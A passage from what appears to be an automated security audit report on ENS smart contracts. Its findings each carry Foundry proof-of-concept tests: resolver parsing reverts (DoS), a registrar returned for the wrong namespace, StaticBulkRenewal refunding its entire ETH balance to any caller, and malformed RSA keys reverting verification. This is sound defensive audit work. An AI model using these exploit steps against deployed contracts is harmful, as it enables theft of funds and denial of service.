## Finding Status: Valid
### Finding Status Justification: The described code path exists in production scoped code: DefaultReverseResolver inherits AbstractReverseResolver.resolve(). In the addr(bytes32,uint256) branch, resolve() calls ENSIP19.parseNamespace(name, 0), checks only the valid boolean, discards the parsed namespace coin type, decodes the requested coin type from calldata, and returns abi.encodePacked(chainRegistrar) whenever this resolver's immutable coinType equals the requested ct. Since DefaultReverseResolver sets coinType to COIN_TYPE_DEFAULT, any syntactically valid reverse namespace such as addr.reverse can receive the default.reverse registrar when calldata asks for COIN_TYPE_DEFAULT. The legacy addr(bytes32) branch has the same namespace-discarding pattern, though it returns a nonzero registrar only for COIN_TYPE_ETH, so the reported multicoin default-registrar path is specifically present. No safeguard fully binds the parsed namespace coin type to the resolver's coinType or to the requested coinType. The exact cross-namespace registrar discovery behavior is not documented as intentionally accepted; comments state addr(*) should return the registrar if name is an ENSIP-19 reverse namespace for coinType, which implies namespace scoping. The call is permissionless and currently executable with crafted name/data, does not require privileged actors or compromised keys, and is not merely future speculation or solely user error.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
For the multicoin addr(bytes32,uint256) resolver profile, AbstractReverseResolver.resolve() only checks that the queried DNS name is some syntactically valid reverse namespace. It discards the namespace coin type returned by ENSIP19.parseNamespace() and returns chainRegistrar whenever the requested coin type in calldata equals this resolver's immutable coinType. For DefaultReverseResolver, this means a query against addr.reverse or another valid non-default reverse namespace can return the default.reverse registrar.

Vulnerable snippet:
(bool valid, ) = ENSIP19.parseNamespace(name, 0);
if (!valid) revert UnreachableName(name);
(, uint256 ct) = abi.decode(data[4:], (bytes32, uint256));
return abi.encode(coinType == ct ? abi.encodePacked(chainRegistrar) : new bytes(0));

The parsed namespace coin type is ignored, so the response is scoped only by the requested coin type argument and not by the actual namespace being resolved.

## Impact
Resolver discovery can report the default.reverse registrar for a different valid reverse namespace. Integrations that use extended addr(bytes32,uint256) namespace discovery can be misdirected to the wrong registrar, breaking namespace separation and causing incorrect reverse-resolution routing or identity display.

## Proof of Concept
1. Deploy DefaultReverseResolver with a default registrar R.
2. Query resolve() for the namespace addr.reverse, not default.reverse.
3. Use calldata for IAddressResolver.addr(bytes32,uint256) with coinType set to COIN_TYPE_DEFAULT.
4. The resolver should return empty bytes because addr.reverse is not the default.reverse namespace.
5. Instead, it returns abi.encodePacked(R), proving that registrar discovery is not scoped to the queried namespace.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Test} from 'forge-std/Test.sol';
import {DefaultReverseResolver} from '../contracts/reverseResolver/DefaultReverseResolver.sol';
import {IStandaloneReverseRegistrar} from '../contracts/reverseRegistrar/IStandaloneReverseRegistrar.sol';
import {IAddressResolver} from '../contracts/resolvers/profiles/IAddressResolver.sol';
import {COIN_TYPE_DEFAULT} from '../contracts/utils/ENSIP19.sol';

contract MockRegistrar is IStandaloneReverseRegistrar {
    function nameForAddr(address) external pure returns (string memory) {
        return '';
    }
}

contract DefaultReverseResolverNamespacePoC is Test {
    MockRegistrar registrar;
    DefaultReverseResolver resolver;

    function setUp() public {
        registrar = new MockRegistrar();
        resolver = new DefaultReverseResolver(registrar);
    }

    function _namespace(string memory label) internal pure returns (bytes memory) {
        return abi.encodePacked(bytes1(uint8(bytes(label).length)), bytes(label), bytes1(uint8(7)), bytes('reverse'), bytes1(0));
    }

    function testDefaultRegistrarReturnedForAddrReverseNamespace() public {
        bytes memory data = abi.encodeCall(IAddressResolver.addr, (bytes32(0), COIN_TYPE_DEFAULT));

        bytes memory ret = resolver.resolve(_namespace('addr'), data);
        bytes memory resolvedRegistrar = abi.decode(ret, (bytes));

        assertEq(resolvedRegistrar, abi.encodePacked(address(registrar)));
        assertGt(resolvedRegistrar.length, 0);
    }
}

## Suggested Mitigation
Use the coin type returned by parseNamespace() in the addr resolver branches. For addr(bytes32,uint256), return the registrar only when parsedNamespaceCoinType == coinType and requestedCoinType == coinType; otherwise return empty bytes. Apply the same namespace check to the legacy addr(bytes32) branch, requiring parsedNamespaceCoinType == coinType && coinType == COIN_TYPE_ETH.
```

### M-14 / `0MzfSAZHFu-yafYBgn7kd`
- Finding title: Malformed short DNS TXT context reverts ExtendedDNSResolver._findValue and DoSes resolution
- Report lines: 1198-1258
```md
## [M-14]. Malformed short DNS TXT context reverts ExtendedDNSResolver._findValue and DoSes resolution

## id: 0MzfSAZHFu-yafYBgn7kd

## Derived From Pattern/Invariant
MaturityorGatingByPass / StateMachine invariant: absent keys must return empty bytes instead of reverting

## Exploit Type
Dos

## Location
ExtendedDNSResolver._findValue

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in in-scope ExtendedDNSResolver._findValue. In STATE_START, the code calls data.equals(i, key, 0, key.length) for every attempted key match without checking that i + key.length <= data.length. The supplied BytesUtils.equals implementation hashes key.length bytes from data and calls _checkBound(vA, offA + len), which reverts when the remaining bytes are shorter than the key. Thus a context like one byte of data while searching for a longer key such as a[60]= reaches an OffsetOutOfBoundsError instead of a non-match and empty return. The function comment states it returns the value if found or an empty string if the key does not exist, so this revert is not explicitly accepted design. There is no complete bounds-check safeguard before equals. The code is in a scoped production resolver, can be triggered today via resolve inputs/context used for DNS-backed resolution, and does not depend on privileged actors, user-only mistakes, or future changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When the parser is in STATE_START, it calls data.equals(i, key, 0, key.length) without first checking that i + key.length <= data.length. BytesUtils.equals hashes key.length bytes from data and reverts via OffsetOutOfBoundsError if the remaining suffix is shorter than the searched key. A missing record such as context x while searching for a[60]= should be a non-match and return empty bytes, but instead it reverts. Vulnerable snippet: if (data.equals(i, key, 0, key.length)) { i += key.length; state = STATE_VALUE; } else { state = STATE_IGNORED_KEY; }.

## Impact
Any caller or DNS-controlled context can make supported resolver lookups revert instead of returning an empty record. This causes griefing and resolution DoS for DNS names using ExtendedDNSResolver, and downstream UniversalResolver or wallet integrations cannot gracefully handle missing records.

## Proof of Concept
1. A resolver lookup for addr(bytes32) searches for key a[60]=. 2. Provide a context whose remaining bytes at STATE_START are shorter than six bytes, for example x. 3. _findValue calls BytesUtils.equals with len 6 at offset 0. 4. BytesUtils._checkBound reverts because 0 + 6 > 1. 5. The resolver call reverts instead of returning the documented empty value for an absent key.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ExtendedDNSResolver} from "../contracts/resolvers/profiles/ExtendedDNSResolver.sol";
import {IExtendedDNSResolver} from "../contracts/resolvers/profiles/IExtendedDNSResolver.sol";
import {IAddrResolver} from "../contracts/resolvers/profiles/IAddrResolver.sol";

contract ExtendedDNSResolverShortSuffixPoC is Test {
    ExtendedDNSResolver resolver;

    function setUp() public {
        resolver = new ExtendedDNSResolver();
    }

    function testShortMissingTokenRevertsInsteadOfReturningEmpty() public {
        bytes memory query = abi.encodeWithSelector(IAddrResolver.addr.selector, bytes32(0));

        (bool okGood, bytes memory retGood) = address(resolver).call(abi.encodeWithSelector(IExtendedDNSResolver.resolve.selector, bytes(""), query, bytes("zzzzzz")));
        assertEq(okGood, true);
        assertEq(retGood.length, 0);

        (bool okBad, ) = address(resolver).call(abi.encodeWithSelector(IExtendedDNSResolver.resolve.selector, bytes(""), query, bytes("x")));
        assertEq(okBad, false);
    }
}


## Suggested Mitigation
Before calling data.equals, add an explicit bounds check and treat short suffixes as non-matches: if (i + key.length <= len && data.equals(i, key, 0, key.length)) { ... }. Apply the same bounds discipline before every direct data[i] read.
```

### M-15 / `5YV4UNdiG3l7fe3YbslGB`
- Finding title: Ignored TXT records ending at EOF trigger out-of-bounds reads and DoS ExtendedDNSResolver lookups
- Report lines: 1259-1324
```md
## [M-15]. Ignored TXT records ending at EOF trigger out-of-bounds reads and DoS ExtendedDNSResolver lookups

## id: 5YV4UNdiG3l7fe3YbslGB

## Derived From Pattern/Invariant
MaturityorGatingByPass / StateMachine invariant: parser cursor movement must remain within data.length

## Exploit Type
Dos

## Location
ExtendedDNSResolver._findValue

## Finding Status: Valid
### Finding Status Justification: The parser code described exists in in-scope ExtendedDNSResolver._findValue. Multiple ignored-token states can advance i to len and then read data[i] without an i < len guard. In STATE_IGNORED_KEY_ARG, when data[i] == ']', the code sets state, increments i, then immediately checks data[i] == '='. If the closing bracket is the final byte, this is an out-of-bounds read. Similar unguarded while (data[i] == ' ') loops exist after ignored quoted values and ignored unquoted values once i may have reached len. These paths occur while skipping nonmatching records, which should not revert because _findValue is documented to return empty when the searched key is absent. No complete safeguard bounds-checks these post-increment reads. The issue is in scoped production code, is reachable today with malformed or edge-case TXT context supplied to resolver flows, and does not require privileged access, victim-only misuse, or speculative future behavior.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Several ignored-token states increment i to data.length and then immediately read data[i]. In STATE_IGNORED_KEY_ARG, after a closing bracket at EOF, the parser does i += 1 and then checks data[i]. In STATE_IGNORED_QUOTED_VALUE and STATE_IGNORED_UNQUOTED_VALUE, the parser advances past a closing quote or trailing space and then loops while reading data[i] without an i < len guard. Nonmatching records before the desired key should be skipped, but EOF-shaped ignored tokens revert instead.

## Impact
A malformed or merely edge-case DNS TXT context can make addr() or text() resolution revert even when the requested record is absent or appears later. This is a permissionless griefing/DoS vector against applications resolving affected DNS-backed ENS names.

## Proof of Concept
1. Query text(node, url), which makes _findValue search for t[url]=. 2. Supply a nonmatching ignored key argument that ends exactly at EOF, such as abcdef[y]. 3. The parser enters STATE_IGNORED_KEY_ARG, increments i after ], then reads data[i] while i == len. 4. Equivalent EOF reverts occur for ignored quoted values ending at EOF and ignored unquoted values with trailing spaces. 5. Resolution reverts instead of skipping the ignored token and returning an empty value.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ExtendedDNSResolver} from "../contracts/resolvers/profiles/ExtendedDNSResolver.sol";
import {IExtendedDNSResolver} from "../contracts/resolvers/profiles/IExtendedDNSResolver.sol";
import {ITextResolver} from "../contracts/resolvers/profiles/ITextResolver.sol";

contract ExtendedDNSResolverIgnoredEofPoC is Test {
    ExtendedDNSResolver resolver;

    function setUp() public {
        resolver = new ExtendedDNSResolver();
    }

    function testIgnoredTokensEndingAtEofRevert() public {
        bytes memory query = abi.encodeWithSelector(ITextResolver.text.selector, bytes32(0), string("url"));

        (bool okControl, ) = address(resolver).call(abi.encodeWithSelector(IExtendedDNSResolver.resolve.selector, bytes(""), query, bytes("abcdefg")));
        assertEq(okControl, true);

        _checkReverts(query, bytes("abcdef[y]"));
        _checkReverts(query, bytes("abcdef='abc'"));
        _checkReverts(query, bytes("abcdef=abc "));
    }

    function _checkReverts(bytes memory query, bytes memory context) internal {
        (bool ok, ) = address(resolver).call(abi.encodeWithSelector(IExtendedDNSResolver.resolve.selector, bytes(""), query, context));
        assertEq(ok, false);
    }
}


## Suggested Mitigation
Guard every post-increment read with i < len. For ignored key args, only inspect an equals sign if i < len. For ignored quoted and unquoted values, change while (data[i] == space) loops to while (i < len && data[i] == space).
```

### M-16 / `juVObwZbLvsqXFJSoaFF9`
- Finding title: Ignored bracketed TXT key at EOF DoS in ExtendedDNSResolver._findValue reverts all matching lookups
- Report lines: 1325-1394
```md
## [M-16]. Ignored bracketed TXT key at EOF DoS in ExtendedDNSResolver._findValue reverts all matching lookups

## id: juVObwZbLvsqXFJSoaFF9

## Derived From Pattern/Invariant
CheapGriefingOrDosProfit: malformed ignored key argument at EOF reverts shared resolution path

## Exploit Type
Dos

## Location
ExtendedDNSResolver._findValue

## Finding Status: Valid
### Finding Status Justification: This is a specific instance of the in-scope _findValue parser bug. When a nonmatching key enters STATE_IGNORED_KEY_ARG and the parser sees a closing bracket, it executes i += 1 and immediately reads data[i] to check for '='. For a context ending exactly with the bracket, such as a nonmatching bracketed key at EOF, i equals data.length and the read reverts with an out-of-bounds panic. The initial match check can be avoided by using a token long enough for the searched key length, so the execution path is realistic and matches the finding. The function is supposed to skip ignored tokens and return empty for missing keys; there is no complete bounds guard and no documentation accepting EOF-shaped ignored tokens as revert conditions. It is production scoped code, exploitable today through resolver context, and does not depend on privileged compromise, user-only error, or future code changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
When skipping a non-matching bracketed key, _findValue increments i after the closing bracket and immediately reads data[i] without checking i < len. If the closing bracket is the final byte, Solidity reverts with an out-of-bounds panic. Vulnerable snippet: if (data[i] == "]") { state = STATE_IGNORED_VALUE; i += 1; if (data[i] == "=") { i += 1; } break; }. A context such as "zzzz[y]" is long enough to avoid the initial startsWith bounds bug, but still reverts while skipping the ignored key argument.

## Impact
Any supported resolver query against a malformed context ending in an ignored bracketed key can be forced to revert. This can grief resolver clients and waste gas for users or systems that try to resolve the affected DNS-backed ENS name.

## Proof of Concept
1. The resolver is queried for addr(bytes32), so _findValue searches for a[60]=.
2. The supplied context is a nonmatching bracketed key ending at EOF, e.g. "zzzz[y]".
3. _findValue correctly decides the token is not a[60]= and enters STATE_IGNORED_KEY_ARG.
4. On the final byte ], it increments i to data.length, then immediately reads data[i].
5. The read is out of bounds, causing the resolver call to revert instead of returning an empty missing-record result.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/resolvers/profiles/ExtendedDNSResolver.sol";

contract ExtendedDNSResolverIgnoredKeyArgPoCTest is Test {
    ExtendedDNSResolver internal resolver;

    function setUp() public {
        resolver = new ExtendedDNSResolver();
    }

    function _addrQuery() internal pure returns (bytes memory) {
        return abi.encodeWithSelector(bytes4(keccak256(bytes("addr(bytes32)"))), bytes32(0));
    }

    function testIgnoredKeyArgumentAtEofRevertsInsteadOfReturningEmpty() public {
        bytes memory query = _addrQuery();

        bytes memory benignMissing = resolver.resolve(bytes(""), query, bytes("zzzz=y"));
        assertEq(benignMissing.length, 0);

        (bool ok, bytes memory revertData) = address(resolver).call(
            abi.encodeWithSelector(ExtendedDNSResolver.resolve.selector, bytes(""), query, bytes("zzzz[y]"))
        );

        assertEq(ok, false);
        assertGt(revertData.length, 0);
    }
}


## Suggested Mitigation
After every cursor increment that may advance to len, guard reads with i < len. In STATE_IGNORED_KEY_ARG, only check data[i] == "=" when i < len; otherwise return empty or continue consistently. Apply the same guard pattern to ignored quoted and unquoted value loops that skip trailing spaces.
```

### H-17 / `ykxAX67ZAlhbqeuUQ6hwf`
- Finding title: StaticBulkRenewal.renewAll refunds the entire contract ETH balance to the caller
- Report lines: 1395-1473
```md
## [H-17]. StaticBulkRenewal.renewAll refunds the entire contract ETH balance to the caller

## id: ykxAX67ZAlhbqeuUQ6hwf

## Derived From Pattern/Invariant
PullorPushPaymentbugs / ForcedAssetVsStrictEquality

## Exploit Type
ForcedAssetVsStrictEquality

## Location
StaticBulkRenewal.renewAll

## Finding Status: Valid
### Finding Status Justification: The cited code path exists in the in-scope StaticBulkRenewal.renewAll function. After looping through renewals, it unconditionally executes payable(msg.sender).transfer(address(this).balance), refunding the contract's global ETH balance rather than a per-call refund amount. There is no local accounting that refunds only msg.value minus the amounts spent, and no receive/fallback or recovery logic that would prevent forced ETH from becoming part of address(this).balance. ETH can be forcibly credited to the contract, and any later caller who can make at least one successful renewal can receive that pre-existing balance. The behavior is not documented as an intentionally accepted risk in the supplied material, does not require privileged access, and is not dependent on future integrations. Although normal direct ETH transfers to the contract fail because there is no receive/fallback, that is not a complete safeguard against forced ETH or other existing balance, and the exact global-balance refund path remains reachable.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`renewAll` refunds `address(this).balance` instead of tracking the current call's excess payment. Any ETH already held by `StaticBulkRenewal`, including forcibly sent ETH, is paid to the next successful caller. Vulnerable snippet: `payable(msg.sender).transfer(address(this).balance);`. This violates per-call refund accounting because the refund is based on global contract balance rather than `msg.value - sum(currentRenewalCosts)`.

## Impact
Any ETH at rest in StaticBulkRenewal can be swept by an arbitrary successful renewal caller. If the balance represents registration or renewal funds accidentally or forcibly credited to the contract, those funds are stolen from the contract balance.

## Proof of Concept
1. Force ETH into StaticBulkRenewal before the victim call, for example via a selfdestructing helper. 2. Attacker calls renewAll with one valid renewable name and enough ETH for that renewal. 3. The renewal succeeds. 4. The final refund transfers the entire StaticBulkRenewal balance, including the pre-existing forced ETH, to the attacker.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IPriceOracle { struct Price { uint256 base; uint256 premium; } }
interface IController { function rentPrice(string calldata,uint256) external view returns (IPriceOracle.Price memory); function renew(string calldata,uint256,bytes32) external payable; }

contract StaticBulkRenewal {
    IController controller;
    constructor(IController _controller) { controller = _controller; }
    function renewAll(string[] calldata names, uint256 duration, bytes32 referrer) external payable {
        uint256 length = names.length;
        for (uint256 i; i < length;) {
            IPriceOracle.Price memory price = controller.rentPrice(names[i], duration);
            uint256 totalPrice = price.base + price.premium;
            controller.renew{value: totalPrice}(names[i], duration, referrer);
            unchecked { ++i; }
        }
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract MockController is IController {
    function rentPrice(string calldata,uint256) external pure returns (IPriceOracle.Price memory) { return IPriceOracle.Price(1 ether, 0); }
    function renew(string calldata,uint256,bytes32) external payable { require(msg.value == 1 ether, "price"); }
}

contract ForceSend { constructor(address target) payable { selfdestruct(payable(target)); } }

contract StaticBulkRenewalSweepPoC is Test {
    function testCallerSweepsPreExistingBalance() external {
        StaticBulkRenewal bulk = new StaticBulkRenewal(new MockController());
        new ForceSend{value: 2 ether}(address(bulk));
        address attacker = address(0xA11CE);
        vm.deal(attacker, 1 ether);
        string[] memory names = new string[](1);
        names[0] = "alice";
        uint256 beforeBal = attacker.balance;
        vm.prank(attacker);
        bulk.renewAll{value: 1 ether}(names, 365 days, bytes32(0));
        assertEq(address(bulk).balance, 0);
        assertEq(attacker.balance, beforeBal + 2 ether);
    }
}

## Suggested Mitigation
Track the per-call amount spent and refund only `msg.value - totalSpent`. Do not refund pre-existing balance. Prefer a pull-refund pattern or `if (refund > 0) Address.sendValue(payable(msg.sender), refund);` after computing `refund` from current-call accounting only.
```

### H-18 / `lgI_AYG83YjljxWSCyCrG`
- Finding title: StaticBulkRenewal.renewAll fails at the final grace-period timestamp when premium refund is returned
- Report lines: 1474-1552
```md
## [H-18]. StaticBulkRenewal.renewAll fails at the final grace-period timestamp when premium refund is returned

## id: lgI_AYG83YjljxWSCyCrG

## Derived From Pattern/Invariant
MaturityorGatingByPass / PullorPushPaymentbugs

## Exploit Type
Dos

## Location
StaticBulkRenewal.renewAll

## Finding Status: Valid
### Finding Status Justification: The relevant contracts and path exist in scope. StaticBulkRenewal.renewAll obtains controller.rentPrice, computes totalPrice as price.base + price.premium, and forwards that full amount to ETHRegistrarController.renew. ETHRegistrarController.renew only requires and charges price.base, then refunds msg.value - price.base to msg.sender. Here msg.sender is StaticBulkRenewal. BaseRegistrarImplementation.renew permits renewal when expiries[id] + GRACE_PERIOD >= block.timestamp, while ExponentialPremiumPriceOracle returns zero premium only when expires + GRACE_PERIOD > block.timestamp; at equality it computes a positive premium if startPremium exceeds endValue. Thus at the exact equality timestamp, bulk renewal can overpay the controller, triggering a premium refund to StaticBulkRenewal. Because StaticBulkRenewal has no payable receive/fallback, the controller's transfer back to it reverts, rolling back the renewal. No complete safeguard blocks this exact edge case, it is not documented as accepted design, does not require privileged access or user misuse, and is exploitable in current code when the timestamp and oracle premium condition occur.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
At the exact boundary where `BaseRegistrarImplementation.renew` still permits renewal (`expiries[id] + GRACE_PERIOD >= block.timestamp`), the premium oracle can return a positive premium because premium is waived only when `expires + GRACE_PERIOD > block.timestamp`. `StaticBulkRenewal` forwards `price.base + price.premium` to `ETHRegistrarController.renew`, but the controller charges only `price.base` for renewals and refunds the premium to `msg.sender`, which is StaticBulkRenewal. StaticBulkRenewal has no `receive()` or fallback, so the controller refund transfer reverts and the whole bulk renewal fails. Vulnerable snippet: `uint256 totalPrice = price.base + price.premium; controller.renew{value: totalPrice}(names[i], duration, referrer);`.

## Impact
A name that is still renewable through the canonical controller can become impossible to renew through StaticBulkRenewal at its last valid renewal timestamp. After the next timestamp the registrar no longer permits renewal, so users relying on bulk renewal can permanently lose the name/NFT renewal opportunity.

## Proof of Concept
1. A name has `expiry + GRACE_PERIOD == block.timestamp`. 2. The controller oracle returns `base > 0` and `premium > 0` at equality. 3. Direct `ETHRegistrarController.renew` with `msg.value == base` succeeds because the base registrar still accepts the renewal. 4. `StaticBulkRenewal.renewAll` forwards `base + premium`. 5. The controller attempts to refund `premium` to StaticBulkRenewal. 6. Because StaticBulkRenewal cannot receive ETH, the refund reverts and the renewal is rolled back.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IPriceOracle { struct Price { uint256 base; uint256 premium; } }
interface IController { function rentPrice(string calldata,uint256) external view returns (IPriceOracle.Price memory); function renew(string calldata,uint256,bytes32) external payable; }

contract StaticBulkRenewal {
    IController controller;
    constructor(IController _controller) { controller = _controller; }
    function renewAll(string[] calldata names, uint256 duration, bytes32 referrer) external payable {
        for (uint256 i; i < names.length;) {
            IPriceOracle.Price memory price = controller.rentPrice(names[i], duration);
            uint256 totalPrice = price.base + price.premium;
            controller.renew{value: totalPrice}(names[i], duration, referrer);
            unchecked { ++i; }
        }
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract BoundaryController is IController {
    bool public renewed;
    function rentPrice(string calldata,uint256) external pure returns (IPriceOracle.Price memory) { return IPriceOracle.Price(1 ether, 0.5 ether); }
    function renew(string calldata,uint256,bytes32) external payable {
        require(msg.value >= 1 ether, "base");
        renewed = true;
        if (msg.value > 1 ether) payable(msg.sender).transfer(msg.value - 1 ether);
    }
}

contract StaticBulkRenewalBoundaryPoC is Test {
    function testBulkRenewalRevertsOnControllerPremiumRefund() external {
        BoundaryController controller = new BoundaryController();
        StaticBulkRenewal bulk = new StaticBulkRenewal(controller);
        string[] memory names = new string[](1);
        names[0] = "alice";
        vm.expectRevert();
        bulk.renewAll{value: 1.5 ether}(names, 365 days, bytes32(0));
        assertEq(controller.renewed(), false);
        controller.renew{value: 1 ether}("alice", 365 days, bytes32(0));
        assertEq(controller.renewed(), true);
    }
}

## Suggested Mitigation
For renewals, forward only `price.base` to `controller.renew`, because the controller only charges base renewal cost. Alternatively add a payable `receive()` to accept controller refunds, but still compute and return refunds from current-call accounting rather than global balance.
```

### M-19 / `fupzTRRvDjR5RojlZjHzX`
- Finding title: StaticBulkRenewal.renewAll always calls msg.sender refund and blocks non-receivable contract callers
- Report lines: 1553-1634
```md
## [M-19]. StaticBulkRenewal.renewAll always calls msg.sender refund and blocks non-receivable contract callers

## id: fupzTRRvDjR5RojlZjHzX

## Derived From Pattern/Invariant
UnsafeRecipient / PullorPushPaymentbugs

## Exploit Type
Dos

## Location
StaticBulkRenewal.renewAll

## Finding Status: Valid
### Finding Status Justification: The downgrade's EVM/Solidity premise is incorrect. A zero-value transfer is still an external call with empty calldata; Solidity receive/fallback dispatch can execute and revert even when msg.value is 0, and a contract with no suitable receive/fallback can reject the call. Exact payment only makes the transferred value zero; it does not skip the call. Therefore there is no safeguard for exact-payment contract callers, and the described DoS path is mechanically exploitable for callers whose receive/fallback reverts or is absent.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`renewAll` unconditionally executes `payable(msg.sender).transfer(address(this).balance)` after the renewal loop. This performs an external ETH transfer even when no refund is owed. A smart contract caller with no payable receive/fallback, or one whose receive function reverts, cannot use bulk renewal even when it sends the exact required amount and all underlying renewals would succeed. Vulnerable snippet: `payable(msg.sender).transfer(address(this).balance);`.

## Impact
Bulk renewal is unavailable to non-receivable contract accounts and integrations, causing a functional DoS/griefing condition for otherwise valid renewals. The failed final transfer reverts the entire batch, rolling back all successful renewal subcalls.

## Proof of Concept
1. Deploy a contract wallet or integration whose receive function reverts. 2. Fund it with the exact amount needed for a bulk renewal so no refund should be owed. 3. The contract calls `renewAll`. 4. All controller renewals would succeed, but the final zero-balance refund call to `msg.sender` reverts. 5. The entire batch renewal is rolled back.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IPriceOracle { struct Price { uint256 base; uint256 premium; } }
interface IController { function rentPrice(string calldata,uint256) external view returns (IPriceOracle.Price memory); function renew(string calldata,uint256,bytes32) external payable; }

contract StaticBulkRenewal {
    IController controller;
    constructor(IController _controller) { controller = _controller; }
    function renewAll(string[] calldata names, uint256 duration, bytes32 referrer) external payable {
        for (uint256 i; i < names.length;) {
            IPriceOracle.Price memory price = controller.rentPrice(names[i], duration);
            controller.renew{value: price.base + price.premium}(names[i], duration, referrer);
            unchecked { ++i; }
        }
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract ExactPriceController is IController {
    bool public renewed;
    function rentPrice(string calldata,uint256) external pure returns (IPriceOracle.Price memory) { return IPriceOracle.Price(1 ether, 0); }
    function renew(string calldata,uint256,bytes32) external payable { require(msg.value == 1 ether, "exact"); renewed = true; }
}

contract RejectingCaller {
    StaticBulkRenewal immutable bulk;
    constructor(StaticBulkRenewal _bulk) { bulk = _bulk; }
    receive() external payable { revert("reject refund"); }
    function callRenewAll() external payable {
        string[] memory names = new string[](1);
        names[0] = "alice";
        bulk.renewAll{value: msg.value}(names, 365 days, bytes32(0));
    }
}

contract StaticBulkRenewalRefundDoSPoC is Test {
    function testExactPaymentStillRevertsForRejectingCaller() external {
        ExactPriceController controller = new ExactPriceController();
        StaticBulkRenewal bulk = new StaticBulkRenewal(controller);
        RejectingCaller caller = new RejectingCaller(bulk);
        vm.expectRevert();
        caller.callRenewAll{value: 1 ether}();
        assertEq(controller.renewed(), false);
    }
}

## Suggested Mitigation
Only send a refund when the current-call refund is positive. Compute `refund = msg.value - totalSpent` after checked accounting, and skip the external call when `refund == 0`. For nonzero refunds, prefer pull payments or a safe call pattern with clear failure handling.
```

### M-20 / `RLL39_tA45x7uvx02N6gb`
- Finding title: Malformed DNSKEY exponent length makes RSASHA256Algorithm.verify revert instead of rejecting the proof
- Report lines: 1635-1711
```md
## [M-20]. Malformed DNSKEY exponent length makes RSASHA256Algorithm.verify revert instead of rejecting the proof

## id: RLL39_tA45x7uvx02N6gb

## Derived From Pattern/Invariant
DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerMath

## Location
RSASHA256Algorithm.verify

## Finding Status: Valid
### Finding Status Justification: The vulnerable code path exists in the in-scope production contract RSASHA256Algorithm.verify. The function reads the exponent length from caller-controlled key bytes and immediately uses it in substring bounds and checked subtraction. For a short-form key with length 5 and key[4] = 0x02, readUint8(4) succeeds, then substring(5, 2) calls BytesUtils.copyBytes, whose bounds check reverts because offset + length exceeds key.length. For the long-form path, key[4] == 0 causes readUint16(5), which reverts for keys shorter than 7 bytes; longer malformed keys can also trigger out-of-bounds substring checks or Solidity 0.8 checked-arithmetic underflow in key.length - exponentLen - 7. These failures occur before RSAPKCS1Verify.verifySHA256 can return false. There is no complete safeguard that converts malformed DNSKEY material into a clean false result; BytesUtils and Solidity 0.8 checks only enforce memory/arithmetic safety by reverting. The file is explicitly listed in scope under DNSSEC algorithms. No provided documentation states that malformed DNSSEC proof material is intentionally accepted as a full transaction revert. The path is currently reachable by supplying malformed key bytes to verify directly or through DNSSEC proof validation flows that use this algorithm. It does not require privileged access, compromised keys, social engineering, victim-only misuse, or future protocol changes.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
RSASHA256Algorithm.verify trusts the RSA exponent length encoded inside caller-controlled key bytes before checking that the key is long enough for that length. For the short exponent form, a nonzero key[4] is used directly in substring bounds and in `key.length - exponentLen - 5`; for the long exponent form, key[4] == 0 causes `readUint16(5)` and later `key.length - exponentLen - 7` to be evaluated on untrusted, potentially too-short calldata. Malformed DNSSEC proof material therefore reverts with BytesUtils bounds errors or Solidity arithmetic underflow instead of returning false for an invalid signature. Vulnerable snippet: `uint16 exponentLen = uint16(key.readUint8(4)); if (exponentLen != 0) { exponent = key.substring(5, exponentLen); modulus = key.substring(exponentLen + 5, key.length - exponentLen - 5); } else { exponentLen = key.readUint16(5); exponent = key.substring(7, exponentLen); modulus = key.substring(exponentLen + 7, key.length - exponentLen - 7); }`. Because DNSSEC oracle, registrar, relayer, smart-wallet, or multicall integrations dispatch untrusted proof bytes into this verifier, a malicious proof submitter or malformed DNSKEY provider can turn an invalid RSA proof into a full caller-flow revert rather than a clean failed validation result.

## Impact
Medium griefing and gas theft: malformed DNSSEC proof bytes can abort verify-dependent ENS DNS import, oracle, relayer, or batched wallet flows and force victims or relayers that submit the proof to pay gas for a transaction that should have cleanly returned false.

## Proof of Concept
1. An attacker crafts a DNSKEY byte array shorter than the encoded RSA exponent length, for example five bytes where key[4] is 0x02. 2. A DNSSEC oracle, registrar helper, relayer, or smart wallet passes the proof-derived key bytes to RSASHA256Algorithm.verify. 3. verify reads exponentLen as 2 and calls key.substring(5, 2). 4. BytesUtils.copyBytes detects that offset + length exceeds key.length and reverts, or equivalent malformed long-form keys hit readUint16/underflow paths. 5. The surrounding proof-validation transaction reverts instead of receiving false and continuing/rejecting the individual proof cleanly.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/dnssec-oracle/algorithms/RSASHA256Algorithm.sol";

contract RSASHA256AlgorithmMalformedKeyPoC is Test {
    RSASHA256Algorithm internal verifier;

    function setUp() public {
        verifier = new RSASHA256Algorithm();
    }

    function testMalformedShortExponentKeyRevertsInsteadOfReturningFalse() public {
        bytes memory malformedKey = hex"0000000002";
        bool reverted;
        bool result;

